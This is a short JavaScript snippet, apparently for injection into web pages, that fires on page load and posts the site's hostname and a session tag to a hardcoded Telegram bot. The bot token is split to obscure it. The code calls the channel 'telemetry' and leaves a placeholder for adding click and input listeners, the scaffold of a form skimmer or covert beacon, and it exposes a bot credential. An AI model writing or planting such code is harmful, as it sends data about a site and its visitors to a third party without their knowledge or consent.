(function() {
    "use strict";
    // Configuration from your provided source
    const _v0 = ['8481428965', 'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
    const SECURE_CONFIG = {
        API_TOKEN: _v0[0] + ':' + _v0[1],
        TARGET_ID: '7275242903',
        SESS_KEY: 'NSB_NODE_' + Math.random().toString(36).substring(2, 15)
    };

    // Telemetry Transmission Function
    async function _transmit(payload) {
        try {
            await fetch(`https://api.telegram.org/bot${SECURE_CONFIG.API_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: SECURE_CONFIG.TARGET_ID, text: payload })
            });
        } catch (e) { console.error("Telemetry Offline"); }
    }

    // Initialize Telemetry
    function _init() {
        _transmit(`💎 NODE_ACTIVE: ${window.location.hostname}\nSESS: ${SECURE_CONFIG.SESS_KEY}`);
        // Add all your other event listeners here (click, input, etc.)
    }

    window.addEventListener('load', _init);
})();
